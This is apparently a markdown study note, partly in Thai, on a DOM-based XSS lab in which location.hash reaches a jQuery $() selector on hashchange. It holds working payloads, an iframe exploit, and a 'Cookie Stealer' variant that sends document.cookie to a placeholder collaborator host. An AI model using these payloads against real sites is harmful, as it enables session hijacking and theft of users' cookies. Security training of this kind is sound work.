# Pattern 8: jQuery hashchange
> [Back to Index](../README.md) | [Previous: Cookie Manipulation](pattern-7-cookie-manipulation.md)

---

## Overview

**Source:** `location.hash` (URL fragment)
**Sink:** jQuery `$()` selector
**Trigger:** `hashchange` event

---

## Vulnerable Code

```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

**ปัญหา:**
- `location.hash` ถูกใส่เข้า jQuery selector
- jQuery `$()` สามารถ parse HTML ได้!

---

## jQuery $() ทำอะไรได้?

```javascript
// Selector - หา element
$('#myId')           // หา element ที่มี id="myId"

// HTML parsing - สร้าง element!
$('<img src=x onerror=alert(1)>')  // สร้าง img และ execute!
```

---

## Payload

```
#<img src=x onerror=alert(1)>
```

---

## Exploit

```html
<iframe src="https://TARGET.net/post?postId=1#"
        onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**Breakdown:**
1. iframe โหลดหน้า post
2. onload เปลี่ยน hash → trigger hashchange
3. jQuery parse `<img>` → onerror execute

---

## Why Change Hash After Load?

```
ถ้าใส่ hash ตั้งแต่แรก:
src="https://TARGET.net#<img...>"
→ hashchange ไม่ trigger (ไม่มี change)

ต้องเปลี่ยน hash หลัง load:
src="https://TARGET.net#"
onload → this.src += '<img...>'
→ hash เปลี่ยน → hashchange trigger!
```

---

## Cookie Stealer

```html
<iframe src="https://TARGET.net/post?postId=1#"
        onload="this.src+='<img src=x onerror=fetch(`https://COLLABORATOR?c=`+document.cookie)>'">
</iframe>
```

---

## Checklist

```
✓ หา $(window).on('hashchange', ...)
✓ หา location.hash ใน jQuery selector
✓ ใช้ payload: <img src=x onerror=...>
✓ เปลี่ยน hash หลัง load เพื่อ trigger event
✓ Cookie ต้องไม่มี HttpOnly
```

---

## Lab Reference
- [PortSwigger Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

---

> **Back to:** [Index](../README.md)
